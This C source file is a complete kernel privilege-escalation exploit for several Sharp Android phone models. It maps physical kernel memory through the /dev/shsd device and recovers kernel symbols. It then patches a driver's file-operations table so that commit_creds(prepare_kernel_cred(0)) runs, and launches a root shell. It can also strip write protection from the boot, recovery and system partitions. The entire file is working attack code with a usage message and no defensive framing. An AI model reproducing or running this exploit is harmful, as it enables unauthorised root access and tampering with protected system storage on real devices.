#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <cutils/properties.h>
#include <getopt.h>

#define DBGPRINT(fmt...)		if (verbose) fprintf(stderr, fmt)

static int stragetype = 0;	//0:nand 1:mmc
static unsigned long shsd_base_addr_hcs1 = 0x01000000;

static int verbose = 0;
volatile int iscalled = 0;
static int do_unlock_nand = 0;

static void* mmap_addr = (void*)0x01000000;

static char devicename[4096] = "/dev/shsd";
void* shsd_ioctl;
void* shsd_mmap;
void* shsd_open;
void* shsd_release;

int (*commit_creds)() = (void*)0;
void* (*prepare_kernel_cred)() = (void*)0;

struct msm_nand_protect_area_info {
	uint64_t start;
	uint64_t end;
	uint32_t flg;
};
static struct msm_nand_protect_area_info* s_protect_info = (void*)0;

struct mmc_protect_inf {
	uint32_t partition;
	uint32_t protect;
};
static struct mmc_protect_inf* mmc_protect_part = (void*)0;
static int mmc_protect_area_num = 0;

static unsigned long kallsyms_num_syms;
static unsigned long* kallsyms_addresses;
static uint8_t* kallsyms_names;
static uint8_t* kallsyms_token_table;
static uint16_t* kallsyms_token_index;
static unsigned long* kallsyms_markers;

/*
 * Expand a compressed symbol data into the resulting uncompressed string,
 * given the offset to where the symbol is in the compressed stream.
 */
static unsigned int kallsyms_expand_symbol(unsigned int off, char *result)
{
	int len, skipped_first = 0;
	const uint8_t *tptr, *data;

	/* Get the compressed symbol length from the first symbol byte. */
	data = &kallsyms_names[off];
	len = *data;
	data++;

	/*
	 * Update the offset to return the offset for the next symbol on
	 * the compressed stream.
	 */
	off += len + 1;

	/*
	 * For every byte on the compressed symbol data, copy the table
	 * entry for that byte.
	 */
	while (len) {
		tptr = &kallsyms_token_table[kallsyms_token_index[*data]];
		data++;
		len--;

		while (*tptr) {
			if (skipped_first) {
				*result = *tptr;
				result++;
			} else
				skipped_first = 1;
			tptr++;
		}
	}

	*result = '\0';

	/* Return to offset to the next symbol. */
	return off;
}

/* Lookup the address for this symbol. Returns 0 if not found. */
unsigned long kallsyms_lookup_name(const char *name)
{
	char namebuf[1024];
	unsigned long i;
	unsigned int off;

	for (i = 0, off = 0; i < kallsyms_num_syms; i++) {
		off = kallsyms_expand_symbol(off, namebuf);

		if (strcmp(namebuf, name) == 0)
			return kallsyms_addresses[i];
	}
	return 0;
}

static unsigned long get_symbol_pos(unsigned long addr,
									unsigned long *symbolsize,
									unsigned long *offset)
{
	unsigned long symbol_start = 0, symbol_end = 0;
	unsigned long i, low, high, mid;

	/* Do a binary search on the sorted kallsyms_addresses array. */
	low = 0;
	high = kallsyms_num_syms;

	while (high - low > 1) {
		mid = low + (high - low) / 2;
		if (kallsyms_addresses[mid] <= addr)
			low = mid;
		else
			high = mid;
	}

	/*
	 * Search for the first aliased symbol. Aliased
	 * symbols are symbols with the same address.
	 */
	while (low && kallsyms_addresses[low-1] == kallsyms_addresses[low])
		--low;

	symbol_start = kallsyms_addresses[low];

	/* Search for next non-aliased symbol. */
	for (i = low + 1; i < kallsyms_num_syms; i++) {
		if (kallsyms_addresses[i] > symbol_start) {
			symbol_end = kallsyms_addresses[i];
			break;
		}
	}

	if (!symbol_end)
		return 0;

	if (symbolsize)
		*symbolsize = symbol_end - symbol_start;
	if (offset)
		*offset = addr - symbol_start;

	return low;
}

/*
 * Lookup an address but don't bother to find any names.
 */
int kallsyms_lookup_size_offset(unsigned long addr, unsigned long *symbolsize,
								unsigned long *offset)
{
	return !!get_symbol_pos(addr, symbolsize, offset);
}

static const unsigned long const pattern_kallsyms_addresses[] = {
	0xc0008000, // __init_begin
	0xc0008000, // _sinittext
	0xc0008000, // _stext
	0xc0008000  // stext
};

static unsigned long* search_pattern(unsigned long* base, unsigned long count, const unsigned long* const pattern, int patlen)
{
	unsigned long* addr = base;
	unsigned long i;
	for (i = 0; i < count; i++) {
		if(addr[i] != pattern[0]) continue;
		if (memcmp(&addr[i], pattern, patlen) == 0) {
			return &addr[i];
		}
	}
	return 0;
}

void memdump(char* addr, int num, unsigned long offset, int is_stderr)
{
	FILE* stream = stdout;
	int i, j;
	int n = (num + 15) / 16;
	if (is_stderr) stream = stderr;
	for (j=0; j<n; j++){
		fprintf(stream, "%08x : ", (unsigned int)addr + (unsigned int)offset);
		for(i=0; i<16; i++){
			fprintf(stream, "%02x ", *addr++);
		}
		addr -= 16;
		for(i=0; i<16; i++){
			if (*addr>=0x20 && *addr<0x80) {
				 fprintf(stream, "%c", *addr);
			} else {
				fprintf(stream, ".");
			}
			addr++;
		}
		fprintf(stream, "\n");
	}
}

void dump_maps(int is_stderr)
{
	int fd = 1;
	char buf[0x4000];
	if (is_stderr)
		fd = 2;
	int fdmap = open("/proc/self/maps", O_RDONLY);
	int ret = read(fdmap, buf, sizeof(buf));
	write(fd, buf, ret);
	close(fdmap);
}

int prepare_kallsyms_addresses(unsigned long* mem, unsigned long length, unsigned long offset)
{
	unsigned long* addr = mem;
	unsigned long* end = (unsigned long*)((unsigned long)mem + length);
	DBGPRINT("-- finding kallsyms table...\n");
	while(addr < end) {
		// get kallsyms_addresses pointer
		addr = search_pattern(addr, end - addr, pattern_kallsyms_addresses, sizeof(pattern_kallsyms_addresses));
		if (!addr) {
			return 0;
		} else {
			kallsyms_addresses = addr;
			DBGPRINT("  kallsyms_addresses=%08x\n", (unsigned int)kallsyms_addresses + (unsigned int)offset);

			// search end of kallsyms_addresses
			unsigned long n=0;
			while (addr[0] > 0xc0000000) {
				n++;
				addr++;
				if (addr >= end) return 0;
			}
			DBGPRINT("  count=%08x\n", (unsigned int)n);

			// skip there is filled by 0x0
			while (addr[0] == 0x00000000) {
				addr++;
				if (addr >= end) return 0;
			}

			kallsyms_num_syms = addr[0];
			addr++;
			if (addr >= end) return 0;
			DBGPRINT("  kallsyms_num_syms=%08x\n", (unsigned int)kallsyms_num_syms);

			// check kallsyms_num_syms
			if (kallsyms_num_syms != n) {
				DBGPRINT("  -> unmatch!\n");
				continue;
			}
			DBGPRINT("  -> OK!\n");

			// skip there is filled by 0x0
			while (addr[0] == 0x00000000) {
				addr++;
				if (addr >= end) return 0;
			}

			kallsyms_names = (uint8_t*)addr;
			DBGPRINT("  kallsyms_names=%08x\n", (unsigned int)kallsyms_names + (unsigned int)offset);

			// search end of kallsyms_names
			unsigned long i;
			unsigned int off;
			for (i = 0, off = 0; i < kallsyms_num_syms; i++) {
				int len = kallsyms_names[off];
				off += len + 1;
				if (&kallsyms_names[off] >= (uint8_t*)end) return 0;
			}

			// adjust
			addr = (unsigned long*)((((unsigned long)&kallsyms_names[off]-1)|0x3)+1);
			if (addr >= end) return 0;

			// skip there is filled by 0x0
			while (addr[0] == 0x00000000) {
				addr++;
				if (addr >= end) return 0;
			}
			// but kallsyms_markers shoud be start 0x00000000
			addr--;

			kallsyms_markers = addr;
			DBGPRINT("  kallsyms_markers=%08x\n", (unsigned int)kallsyms_markers + (unsigned int)offset);

			// end of kallsyms_markers
			addr = &kallsyms_markers[((kallsyms_num_syms-1)>>8)+1];
			if (addr >= end) return 0;

			// skip there is filled by 0x0
			while (addr[0] == 0x00000000) {
				addr++;
				if (addr >= end) return 0;
			}

			kallsyms_token_table = (uint8_t*)addr;
			DBGPRINT("  kallsyms_token_table=%08x\n", (unsigned int)kallsyms_token_table + (unsigned int)offset);

			// search end of kallsyms_token_table
			i = 0;
			while (kallsyms_token_table[i] != 0x00 || kallsyms_token_table[i+1] != 0x00) {
				i++;
				if (&kallsyms_token_table[i-1] >= (uint8_t*)end) return 0;
			}

			// skip there is filled by 0x0
			while (kallsyms_token_table[i] == 0x00) {
				i++;
				if (&kallsyms_token_table[i-1] >= (uint8_t*)end) return 0;
			}

			// but kallsyms_markers shoud be start 0x0000
			kallsyms_token_index = (uint16_t*)&kallsyms_token_table[i-2];
			DBGPRINT("  kallsyms_token_index=%08x\n", (unsigned int)kallsyms_token_index + (unsigned int)offset);
			DBGPRINT("  done.\n");

			return 1;
		}
	}
	return 0;
}

unsigned long get_fop_shsd_read(unsigned long* mem, unsigned long length, unsigned long offset)
{
	unsigned long* addr = mem;
	unsigned long* end = (unsigned long*)((unsigned long)mem + length);
	unsigned long pattern_shsd_fops[] = {
			0x00000000								, // (owner)
			0x00000000								, // (llseek)
			0x00000000								, // (read)
			0x00000000								, // (write)
			0x00000000								, // (aio_read)
			0x00000000								, // (aio_write)
			0x00000000								, // (readdir)
			0x00000000								, // (poll)
			(unsigned long)shsd_ioctl				, // (ioctl)
			0x00000000								, // (unlocked_ioctl)
			0x00000000								, // (compat_ioctl)
			(unsigned long)shsd_mmap				, // (mmap)
			(unsigned long)shsd_open				, // (open)
			0x00000000								, // (flush)
			(unsigned long)shsd_release				, // (release)
			0x00000000								, // (fsync)
			0x00000000								, // (aio_fsync)
			0x00000000								, // (fasync)
			0x00000000								, // (lock)
			0x00000000								, // (sendpage)
			0x00000000								, // (get_unmapped_area)
			0x00000000								, // (check_flags)
			0x00000000								, // (flock)
			0x00000000								, // (splice_write)
			0x00000000								, // (splice_read)
			0x00000000								  // (setlease)
	};
	while(addr < end - (sizeof(pattern_shsd_fops) / sizeof(unsigned long))) {
		addr = search_pattern(addr, end - addr, pattern_shsd_fops, sizeof(pattern_shsd_fops));
		if (!addr) {
			return 0;
		} else {
			addr += 2;
			return (unsigned long)addr;
		}
	}
	return 0;
}

static void* get_s_protect_info(unsigned char* base, unsigned int count)
{
	unsigned char* addr = base;
	unsigned int i, x;
	void** p = NULL;

	DBGPRINT("-- finding nand protect info...\n");
	for (i = 0; i < count - 20; i += 4) {
		if (
			addr[i+ 3] == 0xe5 &&  addr[i+ 2] == 0x9f											 && // ldr r*,=immediate
			addr[i+ 7] == 0xe3 &&  addr[i+ 6] == 0xa0 && addr[i+ 5] == 0x10 && addr[i+ 4] == 0x48 && // mov r1,#0x48
			addr[i+11] == 0xe5 && (addr[i+10] & 0xf0) == 0x90										// ldr ...
		) {
			x = ((addr[i+1] & 0x0f) << 8) | addr[i];
			p = (void**)(addr + i + x + 8);
			DBGPRINT("  addr=%08x\n", (unsigned int)*p);
		}
	}
	if (!p) {
		fprintf(stderr, "nand protect info search failed\n");
		return 0;
	} else {
		DBGPRINT("  done.\n");
	  return *p;
	}
}

int getroot_read(void *filp, char __user *buf, size_t count, loff_t *ppos)
{
	iscalled = 1;
	if (commit_creds != 0 && prepare_kernel_cred != 0) {
		commit_creds(prepare_kernel_cred(0));
	}

	if ( do_unlock_nand == 1 ) {
		if ( stragetype == 0 && s_protect_info != 0 ) {
			s_protect_info[0].flg = 0;  // boot
			s_protect_info[1].flg = 0;  // recovery
			s_protect_info[2].flg = 0;  // system
			do_unlock_nand = 2;
		} else if (stragetype == 1 && mmc_protect_part != 0 && mmc_protect_area_num != 0 ) {
			int i;
			for (i = 0; i < mmc_protect_area_num; i++) {
				if (mmc_protect_part[i].partition > 63 || mmc_protect_part[i].protect > 3)
					break;
				mmc_protect_part[i].protect = 0;
			}
			do_unlock_nand = 2;
		}
	}

	return 0;
}

int getroot()
{
	unsigned long system_start = 0;
	unsigned long system_end = 0;
	unsigned long text_start = 0;
	unsigned long text_end = 0;
	unsigned long data_start = 0;
	unsigned long data_end = 0;

	const char c1[]= "System RAM";
	const char c2[]= "Kernel text";
	const char c3[]= "Kernel data";
	int matched1 = 0;
	int matched2 = 0;
	int matched3 = 0;
	unsigned long long start, end;
	int consumed;
	char line[1024];
	char *str;

	DBGPRINT("-- analyzing iomem...\n");
	FILE *fp;
	fp = fopen("/proc/iomem", "r");
	if (!fp) {
		fprintf(stderr, "iomem open failed \"%s\"(%d)\n", strerror(errno), errno);
		return 0;
	}

	while(fgets(line, sizeof(line), fp) != 0) {
		int count = sscanf(line, "%Lx-%Lx : %n", &start, &end, &consumed);
		if (count != 2)
			continue;

		str = line + consumed;
		if (memcmp(str, c1, strlen(c1)) == 0) {
			system_start = (unsigned long)start;
			system_end = (unsigned long)end;
			matched1 = 1;
			matched2 = 0;
			matched3 = 0;
			DBGPRINT("  System RAM =%08x - %08x\n", (unsigned int)system_start, (unsigned int)system_end);
		}
		if (matched1 && memcmp(str, c2, strlen(c2)) == 0) {
			text_start = (unsigned long)start;
			text_end = (unsigned long)end;
			matched2 = 1;
			DBGPRINT("  Kernel text=%08x - %08x\n", (unsigned int)text_start, (unsigned int)text_end);
		}
		if (matched1 && matched2 && memcmp(str, c3, strlen(c3)) == 0) {
			data_start = (unsigned long)start;
			data_end = (unsigned long)end;
			matched3 = 1;
			DBGPRINT("  Kernel data=%08x - %08x\n", (unsigned int)data_start, (unsigned int)data_end);
		}
		if (matched1 && matched2 && matched3) {
			break;
		}
	}
	fclose(fp);

	if (text_start < system_start || data_start < system_start ||
		text_end > system_end || data_end > system_end ||
		system_start >= system_end || text_start >= text_end ||
		data_start >= data_end
	) {
		fprintf(stderr, "iomem address error\n");
		return 0;
	}
	DBGPRINT("  done.\n");

	unsigned long mmap_target_base = shsd_base_addr_hcs1;
	unsigned long mmap_system_offset = system_start - mmap_target_base;
	unsigned long mmap_system_length = system_end - system_start + 1;
	unsigned long mmap_text_offset = text_start - mmap_target_base;
	unsigned long mmap_text_length = text_end - text_start +1;
	unsigned long mmap_data_offset = data_start - mmap_target_base;
	unsigned long mmap_data_length = data_end - data_start +1;
	unsigned long mmap_length = mmap_data_offset + mmap_data_length;

	DBGPRINT("-- opening device...\n");
	int fd = open(devicename, O_RDWR);
	if (fd < 0) {
		fprintf(stderr, "device open failed \"%s\"(%d)\n", strerror(errno), errno);
		return 0;
	}
	DBGPRINT("  done.\n");

	DBGPRINT("-- mmapping...\n");
	DBGPRINT("  target base  =%08x length=%08x\n", (unsigned int)mmap_target_base, (unsigned int)mmap_length);
	unsigned long* mem;
	mem = (unsigned long*)mmap(mmap_addr, mmap_length, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED, fd, mmap_target_base);
	if(mem == MAP_FAILED)
	{
		fprintf(stderr, "mmap error \"%s\"(%d)\n", strerror(errno), errno);
		close(fd);
		return 0;
	} else {
		unsigned long kernel_offset = 0xc0000000 - ((unsigned long)mem + mmap_system_offset);
		DBGPRINT("  -> OK!\n");
		DBGPRINT("  mapped base  =%08x\n", (unsigned int)mem);
		DBGPRINT("  base offset  =%08x length=%08x\n", (unsigned int)mmap_system_offset, (unsigned int)mmap_system_length);
		DBGPRINT("  text offset  =%08x length=%08x\n", (unsigned int)mmap_text_offset, (unsigned int)mmap_text_length);
		DBGPRINT("  data offset  =%08x length=%08x\n", (unsigned int)mmap_data_offset, (unsigned int)mmap_data_length);
		DBGPRINT("  kernel offset=%08x\n", (unsigned int)kernel_offset);
		if (verbose) dump_maps(1);
		DBGPRINT("  done.\n");

		int ret = prepare_kallsyms_addresses((unsigned long*)((unsigned long)mem + mmap_text_offset),
			mmap_text_length, kernel_offset);
		if (!ret) {
			fprintf(stderr, "kallsyms_addresses search failed\n");
		} else {
			DBGPRINT("-- looking up kallsyms_lookup_name...\n");
			shsd_ioctl			 = (void*)kallsyms_lookup_name("shsd_ioctl");
			shsd_mmap			  = (void*)kallsyms_lookup_name("shsd_mmap");
			shsd_open			  = (void*)kallsyms_lookup_name("shsd_open");
			shsd_release		   = (void*)kallsyms_lookup_name("shsd_release");
			commit_creds		   = (void*)kallsyms_lookup_name("commit_creds");
			prepare_kernel_cred	= (void*)kallsyms_lookup_name("prepare_kernel_cred");
			DBGPRINT("  shsd_ioctl			=%08x\n", (unsigned int)shsd_ioctl);
			DBGPRINT("  shsd_mmap			 =%08x  shsd_open		   =%08x\n", (unsigned int)shsd_mmap,
				(unsigned int)shsd_open);
			DBGPRINT("  shsd_release		  =%08x\n", (unsigned int)shsd_release);
			DBGPRINT("  commit_creds		  =%08x  prepare_kernel_cred =%08x\n", (unsigned int)commit_creds,
				(unsigned int)prepare_kernel_cred);
			

			if ( shsd_ioctl == 0 || shsd_mmap == 0 || shsd_open == 0 || shsd_release == 0 || 
				commit_creds == 0 || prepare_kernel_cred == 0 ) {
					fprintf(stderr, "kallsyms_lookup_name failed\n");
					return 0;
			}

			if ( do_unlock_nand == 1 ) {
				if ( stragetype == 1 ) {
					mmc_protect_part = (void*)kallsyms_lookup_name("mmc_protect_part");
					if ( mmc_protect_part == 0 ) {
						fprintf(stderr, "mmc_protect_part failed\n");
						return 0;
					} else {
						DBGPRINT("  mmc_protect_part	  =%08x\n", (unsigned int)mmc_protect_part);
					}

					if ( !mmc_protect_area_num ) {
							DBGPRINT("-- getting mmc_protect_area_num...\n");
							unsigned long protect_part_size = 0;
							if (kallsyms_lookup_size_offset((unsigned long)mmc_protect_part, &protect_part_size, NULL)) {
								mmc_protect_area_num = protect_part_size / sizeof(struct mmc_protect_inf);
								DBGPRINT("  mmc_protect_part_size =%lu\n", protect_part_size);
								DBGPRINT("  mmc_protect_area_num  =%d\n", mmc_protect_area_num);
								DBGPRINT("  done.\n");
							} else {
								fprintf(stderr, "kallsyms_lookup_size_offset failed\n");
								return 0;
							}
					}
				} else if ( stragetype == 0 ) {
					s_protect_info = (void*)get_s_protect_info((unsigned char*)((unsigned long)mem + mmap_system_offset),
						(unsigned int)(mmap_length - mmap_system_offset));
					if ( s_protect_info == 0 ) {
						fprintf(stderr, "s_protect_info failed\n");
						return 0;
					} else {
						DBGPRINT("  s_protect_info	  =%08x\n", (unsigned int)s_protect_info);
					}
				}
			}

			DBGPRINT("  done.\n");


			DBGPRINT("-- finding file operations struct...\n");
			void** target_fop_read;
			target_fop_read = (void**)get_fop_shsd_read((unsigned long*)((unsigned long)mem + mmap_system_offset),
				(mmap_length - mmap_system_offset), kernel_offset);
			if (!target_fop_read) {
				fprintf(stderr, "file operations struct search failed\n");
			} else {
				DBGPRINT("  addr=%08x\n", (unsigned int)target_fop_read + (unsigned int)kernel_offset);
				if (verbose) memdump((char*)(target_fop_read - 2), 0x68, kernel_offset, 1);
				DBGPRINT("  done.\n");

				DBGPRINT("-- patching file operations struct...\n");
				void* target_original_function;
				target_original_function = *target_fop_read;
				DBGPRINT("  original .read saved. addr=%08x\n", (unsigned int)target_original_function);

				*target_fop_read = (void *)getroot_read;
				DBGPRINT("  .read patched. addr=%08x\n", (unsigned int)getroot_read);
				if (verbose) memdump((char*)(target_fop_read - 2), 0x68, kernel_offset, 1);
				DBGPRINT("  done.\n");

				DBGPRINT("-- calling read function...\n");
				char buf[1024];
				read(fd, buf, 1);

				if (!iscalled) {
					fprintf(stderr, "read function missed\n");
				} else {
					DBGPRINT("  done.\n");
				}

				DBGPRINT("-- repairing file operations struct...\n");
				*target_fop_read = target_original_function;
				if (verbose) memdump((char*)(target_fop_read - 2), 0x68, kernel_offset, 1);
				DBGPRINT("  done.\n");

				if (do_unlock_nand == 1)
					fprintf(stderr, "[x] clearing nand protect area info failed.\n");
				else if (do_unlock_nand == 2)
					DBGPRINT("[o] clearing nand protect area info succeeded.\n");
			}
		}
	}

	if (munmap(mem, mmap_length))
		fprintf(stderr, "munmap error \"%s\"(%d)\n", strerror(errno), errno);

	if (close(fd))
		fprintf(stderr, "close error \"%s\"(%d)\n", strerror(errno), errno);

	return iscalled;
}

int getmodel()
{
	char model[PROPERTY_VALUE_MAX] = {'\0'};
	property_get("ro.product.model", model, "");

	if ( !strcmp(model, "SH-10B") || !strcmp(model, "IS01") ||
		!strcmp(model, "SH-03C") || !strcmp(model, "IS03") ) {

		stragetype = 0;
		shsd_base_addr_hcs1 = 0x60000000;
		return 1;
	} else if ( !strcmp(model, "SH-12C") || !strcmp(model, "SH-13C") ||
		!strcmp(model, "SH-04D") || !strcmp(model, "IS05") || !strcmp(model, "INFOBAR A01") ||
		!strcmp(model, "IS12SH") || !strcmp(model, "IS11SH") || !strcmp(model, "003SH") ||
		!strcmp(model, "005SH") || !strcmp(model, "006SH") || !strcmp(model, "007SH") ) {

		stragetype = 0;
		shsd_base_addr_hcs1 = 0x8b000000;
		return 1;
	} else if ( !strcmp(model, "SH-02D") || !strcmp(model, "IS13SH") ||
		!strcmp(model, "IS14SH") || !strcmp(model, "INFOBAR C01") || !strcmp(model, "009SH") ||
		!strcmp(model, "SBM101SH") || !strcmp(model, "SBM103SH") ) {

		stragetype = 1;
		shsd_base_addr_hcs1 = 0x8b000000;
		return 1;
	} else if ( !strcmp(model, "SH-01D") || !strcmp(model, "SH-06D") ||
		!strcmp(model, "SBM102SH") ) {

		stragetype = 1;
		shsd_base_addr_hcs1 = 0x01000000;
		return 1;
	}
	
	printf("unsupported model \"%s\"\n", model);
	return 0;
}

int main(int argc, char** argv)
{
	char shell[4096] = "/system/bin/sh";
	char* exe;
	char* command = NULL;
	int s;
	int error = 0;
	unsigned long addr;
	
	if ( !getmodel() ) {
		return 2;
	}
	
	int result;
	while ( (result = getopt(argc, argv, "vuhc:s:U:a:b:")) != -1 ) {
		switch ( result ) {
			case 'v':
				verbose = 1;
				break;
			case 'u':
				do_unlock_nand = 1;
				break;
			case 'c':
				command = optarg;
				break;
			case 's':
				strcpy(shell, optarg);
				break;
			case 'U':
				do_unlock_nand = 1;
				stragetype = 1;
				s = sscanf(optarg, "%d", &mmc_protect_area_num);
				break;
			case 'a':
				s = sscanf(optarg, "0x%x", (unsigned int*)&addr);
				if (s == 0)
					s = sscanf(optarg, "%d", (int*)&addr);
				if (s == 0)
					break;
				else
					shsd_base_addr_hcs1 = addr;
				break;
			case 'b':
				s = sscanf(optarg, "0x%x", (unsigned int*)&addr);
				if (s == 0)
					s = sscanf(optarg, "%d", (int*)&addr);
				if (s == 0)
					break;
				else
					mmap_addr = (void*)addr;
				break;
			case 'h':
			case ':':
			case '?':
				error = 1;
				break;
		}
	}

	if ( error ) {
		fprintf(stderr, "Usage: %s [OPTION]\n"
			   "\n"
			   "  -a ADDR	   specify ADDR to SHSD_BASE_ADDR_HCS1\n"
			   "  -b ADDR	   specify ADDR to mapping start\n"
			   "  -c COMMAND	pass COMMAND to the invoked shell\n"
			   "  -s SHELL	  use SHELL instead of the default\n"
			   "  -u			clear mmc or nand protect info\n"
			   "  -U NUM		clear mmc protect info\nspecify number of mmc protect area\n"
			   "				(auto search if not specified)\n"
			   "  -v			verbose output.\n"
			   , argv[0]);
		return 2;
	}

	exe = strrchr(shell, '/') + 1;
	if (getroot()) {
		if (command == NULL) {
			execl(shell, exe, "-i", NULL);
		} else {
			execl(shell, exe, "-c", command, NULL);
		}
	}
	execl(shell, exe, "-c", "", NULL);
	
	return 0;

}
